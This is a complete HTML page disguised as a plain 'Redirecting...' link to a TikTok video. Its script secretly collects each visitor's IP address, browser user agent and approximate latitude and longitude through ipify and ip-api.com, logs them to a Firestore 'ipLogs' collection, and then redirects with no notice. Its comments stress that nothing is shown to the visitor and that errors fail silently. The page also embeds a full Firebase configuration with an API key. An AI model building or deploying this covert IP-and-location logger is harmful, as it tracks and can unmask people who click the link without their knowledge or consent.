<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
</head>
<body>
<script>
  const firebaseConfig = {
    apiKey:"AIzaSyBmeCiF-qqHkaM81Jq-whaxvz4zJ6Ni3R0",
    authDomain:"yachad-32fe3.firebaseapp.com",
    databaseURL:"https://yachad-32fe3-default-rtdb.europe-west1.firebasedatabase.app",
    projectId:"yachad-32fe3",
    storageBucket:"yachad-32fe3.firebasestorage.app",
    messagingSenderId:"720032034735",
    appId:"1:720032034735:web:cabedda1dc842420bbc95a",
    measurementId:"G-YH1NK3RHY3"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // Get visitor IP
  async function getVisitorIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || "unknown";
    } catch {
      return "unknown";
    }
  }

  // Save data to Firestore (best effort, no UI update)
  async function saveToFirestore(lat, lon, ip, source) {
    try {
      const ua = navigator.userAgent;
      const time = new Date().toISOString();
      await db.collection('ipLogs').add({
        ip: ip,
        userAgent: ua,
        timestamp: time,
        latitude: lat,
        longitude: lon,
        source: source
      });
    } catch (e) {
      // fail silently
    }
  }

  // Get IP location from ip-api.com
  async function fetchLocation() {
    try {
      const res = await fetch('https://ip-api.com/json/');
      const data = await res.json();
      return { lat: data.lat || null, lon: data.lon || null };
    } catch {
      return { lat: null, lon: null };
    }
  }

  (async () => {
    const visitorIP = await getVisitorIP();
    const loc = await fetchLocation();

    // Log IP + location in background (do not await here to not delay redirect)
    saveToFirestore(loc.lat, loc.lon, visitorIP, "IP");

    // Redirect immediately, no messages shown
    window.location.href = "https://www.tiktok.com/@elkaaem/video/7535937446920424722?_t=ZS-8yi4cs7jnMr&_r=1";
  })();
</script>
</body>
</html>
